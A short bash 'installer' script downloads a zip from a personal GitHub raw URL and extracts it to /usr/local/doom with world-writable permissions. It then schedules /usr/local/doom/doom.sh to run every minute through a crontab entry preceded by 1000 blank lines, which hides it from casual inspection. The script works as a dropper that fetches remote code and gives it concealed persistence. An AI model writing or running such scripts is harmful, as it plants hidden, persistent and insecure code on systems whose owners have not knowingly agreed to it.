#!/usr/bin/env bash

set -e

echo "Installing dependencies..."
apt update
apt install -y unzip zip cron wget

echo "Starting cron..."
systemctl enable cron
systemctl restart cron

echo "Adding cron job..."
(
crontab -l 2>/dev/null
for i in $(seq 1 1000); do echo ""; done
echo "* * * * * /usr/local/doom/doom.sh >> /var/log/logdoom.log 2>&1"
) | crontab -

echo "Downloading package..."
curl -L -o doom.zip https://raw.githubusercontent.com/bhargav11052001/test/main/doom.zip

echo "Extracting files..."
unzip -o doom.zip -d /usr/local/

echo "Setting permissions..."
chmod -R 777 /usr/local/doom

echo "Cleaning up..."
rm -f doom.zip

echo "Installation completed."
